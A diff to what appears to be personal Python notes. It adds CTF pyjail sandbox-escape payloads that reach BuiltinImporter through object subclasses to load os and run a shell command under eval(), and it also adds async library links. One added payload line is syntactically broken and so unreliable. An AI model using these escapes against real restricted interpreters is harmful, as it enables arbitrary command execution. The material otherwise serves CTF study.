@@ -649,6 +649,10 @@ print(df.to_markdown())
 
     print(eval(eval('"alles.__".'+str(print.__class__)[9]+'ppe'+'r()')+'code__.co_consts'))
     # - [CTFtime\.org / ALLES! CTF 2020 / Pyjail ATricks / Writeup](https://ctftime.org/writeup/23289)
+
+    # under eval()
+    [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls")
+    [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins').exec('print(123)',{'__builtins__':[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('builtins')})
     ```
 - alternative for chars
     ```python
@@ -700,3 +704,9 @@ c_uint(0)
 >>> ctypes.c_uint16(0xffffffff + 1)
 c_ushort(0)
 ```
+
+# async 
+
+- https://pypi.org/project/aionotify/
+- https://sanic.readthedocs.io/en/latest/sanic/getting_started.html
+    - https://sanic.readthedocs.io/en/v20.12.3/sanic/streaming.html
